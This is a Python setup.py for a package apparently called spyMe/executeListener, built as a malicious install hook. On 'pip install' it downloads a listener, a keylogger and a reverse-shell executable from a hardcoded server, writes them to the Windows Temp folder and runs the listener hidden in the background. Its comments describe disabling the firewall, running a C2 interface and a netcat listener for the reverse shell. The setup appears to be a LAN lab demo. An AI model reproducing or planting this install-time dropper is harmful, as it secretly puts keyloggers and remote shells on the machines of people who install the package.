from setuptools import setup
import sys, subprocess, requests, time

##### 1. uninstall wheels (located in c:\users\<USER>\appdata\local\programs\python\python310\lib\site-packages if installed)
##### 2. disable Windows Firewall to connect to components in your LAN 
##### 3. run Rebex (SFTP) - *important to open it from C2 Folder!*
##### 4. run C2_Interface.py [EDIT: preferably run in IDE not from command line]
##### 5. open <malServ> in Browser to start keylogging
##### 6. optional: spawn listener for revershell with "netcat -nlvp 8888" 
##### 7. pip install spyMe (--no-cache-dir)

malServ = "http://192.168.178.46:5000/" 

def execListener():
    # download listener & payload (=keylogger)
    r = requests.get(url=malServ+"listener_exe")
    open("C:\Windows\Temp\Alistener.exe", "wb").write(r.content)
    r = requests.get(url=malServ+"payload_exe")
    open("C:\Windows\Temp\ALog_my_keys.exe", "wb").write(r.content)
    r = requests.get(url=malServ+"Rshell_exe")
    open("C:\Windows\Temp\ARshell.exe", "wb").write(r.content)

    #execute listener as exe in background
    time.sleep(1)
    subprocess.Popen("C:\Windows\Temp\Alistener.exe", creationflags=8, close_fds=True)
    time.sleep(1)
    return

#only execute with 'pip install' (once≠twice)
if sys.argv[1] == 'install':
    execListener()

setup(
    name="executeListener",
    version="0.0.3",
    packages=[],
)
